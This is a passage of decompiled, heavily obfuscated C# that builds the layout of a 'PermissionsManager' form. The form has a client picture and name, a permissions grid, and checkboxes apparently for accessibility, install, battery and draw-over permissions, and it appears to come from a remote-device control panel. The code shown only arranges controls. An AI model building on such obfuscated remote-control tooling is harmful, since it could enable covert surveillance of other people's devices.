            ((PermissionsManager) this).DGVPRIM.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            ((PermissionsManager) this).DGVPRIM.Columns.AddRange((DataGridViewColumn) ((PermissionsManager) this).iconprim, (DataGridViewColumn) ((PermissionsManager) this).primname, (DataGridViewColumn) ((PermissionsManager) this).Status);
            num1 = (int) num2 * 637420154 ^ 1831515892;
            continue;
          case 202:
            ((PermissionsManager) this).PictureBox1 = new PictureBox();
            num1 = (int) num2 * 1979194364 ^ -1847015988;
            continue;
          case 203:
            ((PermissionsManager) this).PictureBox1.Name = EXGuarder.\u003483B2555;
            num1 = (int) num2 * -1632086509 ^ 4591067;
            continue;
          case 204:
            ((PermissionsManager) this).TabPage2.TabIndex = 1;
            num1 = (int) num2 * -729832083 ^ 618797562;
            continue;
          case 205:
            ((PermissionsManager) this).comboproms.FillColor = Color.White;
            ((PermissionsManager) this).comboproms.Font = new Font(EXGuarder.\u00332186A2B, 14f);
            ((PermissionsManager) this).comboproms.Items.AddRange(new object[11]
            {
              (object) EXGuarder.\u00339427920,
              (object) EXGuarder.\u00357151166,
              (object) EXGuarder.\u00342537824,
              (object) EXGuarder.\u0031673744F,
              (object) EXGuarder.\u00376270475,
              (object) EXGuarder.\u0033477441C,
              (object) EXGuarder.\u003332E471A,
              (object) EXGuarder.\u0036B4A116C,
              (object) EXGuarder.\u00336495F58,
              (object) EXGuarder.\u00321082A52,
              (object) EXGuarder.\u0031B59145C
            });
            num1 = (int) num2 * 1979947742 ^ 463797218;
            continue;
          case 206:
            ((PermissionsManager) this).DrakeUITabControl1.TabUnSelectedForeColor = Color.FromArgb(240, 240, 240);
            ((PermissionsManager) this).TabPage1.BackColor = Color.Black;
            ((PermissionsManager) this).TabPage1.Controls.Add((Control) ((PermissionsManager) this).DGVPRIM);
            ((PermissionsManager) this).TabPage1.Controls.Add((Control) ((PermissionsManager) this).DrakeUIButtonIcon3);
            ((PermissionsManager) this).TabPage1.Location = new Point(0, 40);
            ((PermissionsManager) this).TabPage1.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).TabPage1.Name = EXGuarder.\u00303412B4E;
            num1 = (int) num2 * -1335751461 ^ 1037968621;
            continue;
          case 207:
            ((PermissionsManager) this).TabPage3.Text = EXGuarder.\u003114E2349;
            ((PermissionsManager) this).Checkbg.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((PermissionsManager) this).Checkbg.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1864488048 ^ 2110570251;
            continue;
          case 208:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).DrakeUIButtonIcon3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -269496398 ^ -1287125021;
            continue;
          case 209:
            ((PermissionsManager) this).checkinstall.Name = EXGuarder.\u003496F6E1A;
            num1 = (int) num2 * -142744282 ^ -1127500283;
            continue;
          case 210:
            ((PermissionsManager) this).DrakeUITabControl1.Controls.Add((Control) ((PermissionsManager) this).TabPage2);
            ((PermissionsManager) this).DrakeUITabControl1.Controls.Add((Control) ((PermissionsManager) this).TabPage3);
            num1 = (int) num2 * 1996648152 ^ -1255309756;
            continue;
          case 211:
            ((PermissionsManager) this).Panel1.SuspendLayout();
            num1 = (int) num2 * -1609354428 ^ -1221639006;
            continue;
          case 212:
            ((PermissionsManager) this).DGVPRIM.ShowEditingIcon = false;
            num1 = (int) num2 * 1239606776 ^ 1548238046;
            continue;
          case 213:
            ((PermissionsManager) this).checkacess.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).checkacess.Location = new Point(22, 26);
            ((PermissionsManager) this).checkacess.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 1016369333 ^ -1562973810;
            continue;
          case 214:
            ((PermissionsManager) this).Label1.Name = EXGuarder.\u00352522267;
            num1 = (int) num2 * -770261240 ^ 1185525379;
            continue;
          case 215:
            ((PermissionsManager) this).DGVPRIM.Name = EXGuarder.\u0034016015E;
            gridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 1223546476 ^ 506375270;
            continue;
          case 216:
            ((PermissionsManager) this).TabPage3.Name = EXGuarder.\u0034F015332;
            num1 = (int) num2 * 1687761859 ^ -1339996334;
            continue;
          case 217:
            ((PermissionsManager) this).Panel1.Name = EXGuarder.\u00362110720;
            ((PermissionsManager) this).Panel1.Size = new Size(700, 89);
            ((PermissionsManager) this).Panel1.TabIndex = 0;
            num1 = (int) num2 * -897863973 ^ 1229357002;
            continue;
          case 218:
            ((PermissionsManager) this).checkinstall.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 570849758 ^ -1628666429;
            continue;
          case 219:
            ((PermissionsManager) this).clinameinfo.Location = new Point(32, 0);
            num1 = (int) num2 * 533425481 ^ -861989355;
            continue;
          case 220:
            ((PermissionsManager) this).primname.Name = EXGuarder.\u0036C51374D;
            num1 = (int) num2 * 1954651058 ^ 1563647927;
            continue;
          case 221:
            ((PermissionsManager) this).PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            ((PermissionsManager) this).PictureBox1.TabIndex = 12;
            ((PermissionsManager) this).PictureBox1.TabStop = false;
            ((PermissionsManager) this).Label4.AutoSize = true;
            num1 = (int) num2 * -543966351 ^ 593622423;
            continue;
          case 222:
            ((PermissionsManager) this).Button2 = new Button();
            num1 = (int) num2 * -1508589197 ^ -193140553;
            continue;
          case 223:
            ((PermissionsManager) this).checkbattery.Cursor = Cursors.Hand;
            num1 = (int) num2 * 1858926944 ^ 90519605;
            continue;
          case 224:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Text = EXGuarder.\u0034456005C;
            num1 = (int) num2 * -1227634814 ^ 2011033750;
            continue;
          case 225:
            ((PermissionsManager) this).Label5.Location = new Point(107, 52);
            ((PermissionsManager) this).Label5.Margin = new Padding(2, 0, 2, 0);
            ((PermissionsManager) this).Label5.Name = EXGuarder.\u003400A1604;
            num1 = (int) num2 * -248980218 ^ 700586594;
            continue;
          case 226:
            ((PermissionsManager) this).TabPage1.TabIndex = 0;
            num1 = (int) num2 * -1955682054 ^ -1822455614;
            continue;
          case 227:
            ((PermissionsManager) this).checkinstall.Cursor = Cursors.Hand;
            num1 = (int) num2 * -815262700 ^ 767657484;
            continue;
          case 228:
            ((PermissionsManager) this).DrakeUIToolTip1.SetToolTip((Control) ((PermissionsManager) this).Button2, EXGuarder.\u003743B5775);
            num1 = (int) num2 * 1403623878 ^ -2092249421;
            continue;
          case 229:
            ((PermissionsManager) this).Label2.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num2 * -1477282580 ^ 1132649842;
            continue;
          case 230:
            ((PermissionsManager) this).clinameinfo.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num2 * -640652916 ^ 255745320;
            continue;
          case 231:
            ((PermissionsManager) this).DGVPRIM.AllowUserToResizeRows = false;
            gridViewCellStyle1.BackColor = Color.Black;
            gridViewCellStyle1.ForeColor = Color.White;
            num1 = (int) num2 * -1903675159 ^ 446998767;
            continue;
          case 232:
            ((PermissionsManager) this).Label4.Size = new Size(130, 19);
            num1 = (int) num2 * -264897330 ^ -992245458;
            continue;
          case 233:
            ((PermissionsManager) this).checkbattery.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 454408281 ^ 1549980830;
            continue;
          case 234:
            ((PermissionsManager) this).Panel1.ResumeLayout(false);
            num1 = (int) num2 * -491627016 ^ -628937590;
            continue;
          case 235:
            ((PermissionsManager) this).TabPage3.Location = new Point(0, 40);
            num1 = (int) num2 * 2089337791 ^ 1091406098;
            continue;
          case 236:
            ((PermissionsManager) this).addactiv.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -1786424980 ^ 1976945823;
            continue;
          case 237:
            ((PermissionsManager) this).checkbattery.Name = EXGuarder.\u0035C612A01;
            ((PermissionsManager) this).checkbattery.Padding = new Padding(22, 0, 0, 0);
            ((PermissionsManager) this).checkbattery.Size = new Size(32, 22);
            num1 = (int) num2 * -1987796159 ^ 1007244103;
            continue;
          case 238:
            ((PermissionsManager) this).Button2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).Button2.Location = new Point(612, 111);
            num1 = (int) num2 * -892438641 ^ 371817622;
            continue;
          case 239:
            ((PermissionsManager) this).TextBox1 = new TextBox();
            num1 = (int) num2 * 894300756 ^ -1053166666;
            continue;
          case 240:
            ((PermissionsManager) this).Label1.ForeColor = Color.White;
            ((PermissionsManager) this).Label1.Location = new Point(58, 27);
            ((PermissionsManager) this).Label1.Margin = new Padding(2, 0, 2, 0);
            num1 = (int) num2 * -1716469015 ^ 509334086;
            continue;
          case 241:
            ((PermissionsManager) this).Primslist.ItemSelectForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).Primslist.Location = new Point(35, 144);
            num1 = (int) num2 * -220096742 ^ 712695919;
            continue;
          case 242:
            ((PermissionsManager) this).TabPage3.Controls.Add((Control) ((PermissionsManager) this).PictureBox1);
            num1 = (int) num2 * -1303353666 ^ -657665929;
            continue;
          case 243:
            ((PermissionsManager) this).addactiv.Size = new Size(49, 26);
            ((PermissionsManager) this).addactiv.TabIndex = 28;
            ((PermissionsManager) this).addactiv.Text = EXGuarder.\u00370085635;
            ((PermissionsManager) this).DrakeUIToolTip1.SetToolTip((Control) ((PermissionsManager) this).addactiv, EXGuarder.\u0032D200B75);
            num1 = (int) num2 * -742098807 ^ 614527288;
            continue;
          case 244:
            ((PermissionsManager) this).Label3.Size = new Size((int) sbyte.MaxValue, 19);
            num1 = (int) num2 * -2145851779 ^ 1407813403;
            continue;
          case 245:
            ((PermissionsManager) this).Panel3.ForeColor = Color.Red;
            ((PermissionsManager) this).Panel3.Location = new Point(0, 0);
            ((PermissionsManager) this).Panel3.Margin = new Padding(2, 2, 2, 2);
            num1 = (int) num2 * 573432222 ^ 792250329;
            continue;
          case 246:
            ((PermissionsManager) this).Button1.Text = EXGuarder.\u00364680C2C;
            ((PermissionsManager) this).Button1.UseVisualStyleBackColor = true;
            num1 = (int) num2 * -1853389988 ^ 569499577;
            continue;
          case 247:
            ((PermissionsManager) this).Panel2.SuspendLayout();
            ((PermissionsManager) this).Panel3.SuspendLayout();
            num1 = (int) num2 * -1783882386 ^ 1567451093;
            continue;
          case 248:
            ((PermissionsManager) this).TabPage3.SuspendLayout();
            ((ISupportInitialize) ((PermissionsManager) this).PictureBox2).BeginInit();
            ((ISupportInitialize) ((PermissionsManager) this).PictureBox1).BeginInit();
            num1 = (int) num2 * 1741260890 ^ -1591635897;
            continue;
          case 249:
            ((PermissionsManager) this).Label2.Location = new Point(316, 26);
            num1 = (int) num2 * -1934973979 ^ -2027284902;
            continue;
          case 250:
            ((PermissionsManager) this).Primslist.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).Primslist.RectDisableColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).Primslist.Size = new Size(625, 149);
            num1 = (int) num2 * 1622436009 ^ 7943731;
            continue;
          case 251:
            ((PermissionsManager) this).TabPage2.ResumeLayout(false);
            num1 = (int) num2 * -561002348 ^ -807060122;
            continue;
          case 252:
            ((PermissionsManager) this).TabPage3.ResumeLayout(false);
            num1 = (int) num2 * 636290590 ^ -1248946596;
            continue;
          case 253:
            ((PermissionsManager) this).DrakeUIButtonIcon3.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).DrakeUIButtonIcon3.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((PermissionsManager) this).DrakeUIButtonIcon3.Size = new Size(700, 50);
            ((PermissionsManager) this).DrakeUIButtonIcon3.Style = UIStyle.Custom;
            num1 = (int) num2 * -1780860448 ^ 653143479;
            continue;
          case 254:
            ((PermissionsManager) this).statustext.Dock = DockStyle.Fill;
            ((PermissionsManager) this).statustext.ForeColor = Color.Lime;
            ((PermissionsManager) this).statustext.Location = new Point(0, 0);
            ((PermissionsManager) this).statustext.Margin = new Padding(2, 0, 2, 0);
            ((PermissionsManager) this).statustext.Name = EXGuarder.\u0033001290A;
            num1 = (int) num2 * 559273560 ^ -218938474;
            continue;
          case (uint) byte.MaxValue:
            gridViewCellStyle5 = new DataGridViewCellStyle();
            num1 = (int) num2 * 1909304267 ^ 1802484365;
            continue;
          case 256:
            ((PermissionsManager) this).DGVPRIM.EnableHeadersVisualStyles = false;
            num1 = (int) num2 * -14980776 ^ 845331546;
            continue;
          case 257:
            gridViewCellStyle4.ForeColor = Color.White;
            num1 = (int) num2 * 915890806 ^ -159905264;
            continue;
          case 258:
            gridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * 688791927 ^ 883223658;
            continue;
          case 259:
            gridViewCellStyle5.SelectionBackColor = Color.White;
            gridViewCellStyle5.SelectionForeColor = Color.Black;
            num1 = (int) num2 * -204727614 ^ 1927805499;
            continue;
          case 260:
            this.ResumeLayout(false);
            num1 = (int) num2 * -1615827470 ^ 654935975;
            continue;
          case 261:
            ((PermissionsManager) this).Label5.ForeColor = Color.White;
            num1 = (int) num2 * 2117254155 ^ -2090698388;
            continue;
          case 262:
            ((PermissionsManager) this).Panel2.Controls.Add((Control) ((PermissionsManager) this).statustext);
            ((PermissionsManager) this).Panel2.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 190347601 ^ -979143354;
            continue;
          case 263:
            gridViewCellStyle5.WrapMode = DataGridViewTriState.False;
            num1 = (int) num2 * -1114473465 ^ 1383618016;
            continue;
          case 264:
            ((PermissionsManager) this).PictureBox2.TabStop = false;
            num1 = (int) num2 * 1784531243 ^ -1542828348;
            continue;
          case 265:
            ((PermissionsManager) this).checkacess.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 418231474 ^ 1867333857;
            continue;
          case 266:
            ((PermissionsManager) this).Label2.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 1190997537 ^ -2019747325;
            continue;
          case 267:
            ((PermissionsManager) this).addactiv.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1016223595 ^ -1357134327;
            continue;
          case 268:
            ((PermissionsManager) this).PictureBox1.Size = new Size(264, 223);
            num1 = (int) num2 * -144018267 ^ -1645359901;
            continue;
          case 269:
            ((PermissionsManager) this).PictureBox2 = new PictureBox();
            num1 = (int) num2 * -1625604030 ^ -131576495;
            continue;
          case 270:
            gridViewCellStyle3.ForeColor = Color.White;
            gridViewCellStyle3.SelectionBackColor = Color.White;
            gridViewCellStyle3.SelectionForeColor = Color.Black;
            gridViewCellStyle3.WrapMode = DataGridViewTriState.True;
            ((PermissionsManager) this).DGVPRIM.RowHeadersDefaultCellStyle = gridViewCellStyle3;
            num1 = (int) num2 * 190139242 ^ -1763520459;
            continue;
          case 271:
            ((PermissionsManager) this).Label1.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            num1 = (int) num2 * 277138628 ^ -1830905064;
            continue;
          case 272:
            ((PermissionsManager) this).comboproms.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num2 * 774210025 ^ 72179115;
            continue;
          case 273:
            ((PermissionsManager) this).clinameinfo = new Label();
            ((PermissionsManager) this).ClientPic = new PictureBox();
            ((PermissionsManager) this).DrakeUITabControl1.SuspendLayout();
            ((PermissionsManager) this).TabPage1.SuspendLayout();
            ((ISupportInitialize) ((PermissionsManager) this).DGVPRIM).BeginInit();
            num1 = (int) num2 * -1527224715 ^ 1247288199;
            continue;
          case 274:
            ((PermissionsManager) this).Panel1.Controls.Add((Control) ((PermissionsManager) this).checkdraw);
            num1 = (int) num2 * -2048537544 ^ -495714237;
            continue;
          case 275:
            ((PermissionsManager) this).TextBox1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((PermissionsManager) this).TextBox1.Location = new Point(0, 294);
            ((PermissionsManager) this).TextBox1.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).TextBox1.Multiline = true;
            ((PermissionsManager) this).TextBox1.Name = EXGuarder.\u0035F087752;
            num1 = (int) num2 * 1032214341 ^ -1337275429;
            continue;
          case 276:
            ((PermissionsManager) this).DGVPRIM.AutoSizeRowsMode = DataGridViewAutoSizeRowsMode.AllCells;
            ((PermissionsManager) this).DGVPRIM.BackgroundColor = Color.Black;
            ((PermissionsManager) this).DGVPRIM.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -1229540761 ^ 991754231;
            continue;
          case 277:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -30813127 ^ -1356071500;
            continue;
          case 278:
            ((PermissionsManager) this).DrakeUIButtonIcon3.Dock = DockStyle.Top;
            num1 = (int) num2 * -388239182 ^ -1900813377;
            continue;
          case 279:
            ((PermissionsManager) this).checkdraw.CheckBoxColor = Color.FromArgb(30, 136, 229);
            ((PermissionsManager) this).checkdraw.Cursor = Cursors.Hand;
            ((PermissionsManager) this).checkdraw.Font = new Font(EXGuarder.\u00332186A2B, 12f);
            ((PermissionsManager) this).checkdraw.Location = new Point(286, 26);
            ((PermissionsManager) this).checkdraw.Margin = new Padding(2, 2, 2, 2);
            ((PermissionsManager) this).checkdraw.Name = EXGuarder.\u003441D760D;
            ((PermissionsManager) this).checkdraw.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 1702084298 ^ 376245313;
            continue;
          case 280:
            ((PermissionsManager) this).Label1.Text = EXGuarder.\u00354641223;
            num1 = (int) num2 * 1631591005 ^ -1880478072;
            continue;
          case 281:
            ((PermissionsManager) this).TabPage2.Size = new Size(700, 359);
            num1 = (int) num2 * -666130515 ^ 800746519;
            continue;
          case 282:
            ((PermissionsManager) this).DGVPRIM.ColumnHeadersDefaultCellStyle = gridViewCellStyle2;
            num1 = (int) num2 * 1050605911 ^ 979777649;
            continue;
          case 283:
            ((PermissionsManager) this).statustext = new Label();
            num1 = (int) num2 * 963343743 ^ -1234712608;
            continue;
          case 284:
            ((PermissionsManager) this).statustext.Size = new Size(700, 22);
            ((PermissionsManager) this).statustext.TabIndex = 1;
            ((PermissionsManager) this).statustext.Text = EXGuarder.\u0034E0D0029;
            num1 = (int) num2 * 931502872 ^ -1665148312;
            continue;
          case 285:
            ((PermissionsManager) this).ClientPic.Dock = DockStyle.Left;
            ((PermissionsManager) this).ClientPic.Location = new Point(0, 0);
            num1 = (int) num2 * -1640086649 ^ 1067073441;
            continue;
          case 286:
            ((PermissionsManager) this).DGVPRIM.GridColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 504721978 ^ 911710163;
            continue;
          case 287:
            ((PermissionsManager) this).checkdraw.Size = new Size(32, 22);
            ((PermissionsManager) this).checkdraw.TabIndex = 14;
            num1 = (int) num2 * -2019369536 ^ -1573693557;
            continue;
          case 288:
            ((PermissionsManager) this).TabPage2.SuspendLayout();
            num1 = (int) num2 * -95072644 ^ -1275796621;
            continue;
          case 289:
            ((PermissionsManager) this).Label2.ForeColor = Color.White;
            num1 = (int) num2 * -1005322696 ^ 1589969125;
            continue;
          default:
            goto label_292;
        }
      }
label_3:
      return;
label_292:;
    }
  }
}
